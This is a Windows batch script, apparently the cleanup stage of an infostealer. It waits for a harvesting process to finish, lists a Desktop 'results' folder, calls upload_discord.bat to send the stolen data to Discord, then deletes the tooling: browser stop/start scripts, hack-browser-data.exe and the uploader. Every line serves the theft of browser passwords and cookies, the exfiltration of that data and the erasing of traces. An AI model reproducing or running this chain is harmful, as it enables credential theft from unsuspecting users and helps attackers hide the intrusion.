REM =====================
REM cleanup.bat
REM =====================
@echo off
setlocal EnableDelayedExpansion
set "processdir=%~1"

echo [DEBUG] Cleanup started...
:WAIT
timeout /t 1 /nobreak > nul
if exist "%processdir%\running.tmp" goto WAIT

echo [DEBUG] Process completed, checking for results...
dir "%USERPROFILE%\Desktop\results"
echo [DEBUG] Running Discord upload...
call "%processdir%\upload_discord.bat"

echo UPLOADED TO DISCORD

echo [DEBUG] Cleaning up files...
del /F /Q "%processdir%\process.bat" 2>nul
del /F /Q "%processdir%\stop_browsers.bat" 2>nul
del /F /Q "%processdir%\start_browsers.bat" 2>nul
del /F /Q "%processdir%\hack-browser-data.exe" 2>nul
del /F /Q "%processdir%\upload_discord.bat" 2>nul
rmdir /S /Q "%processdir%" 2>nul
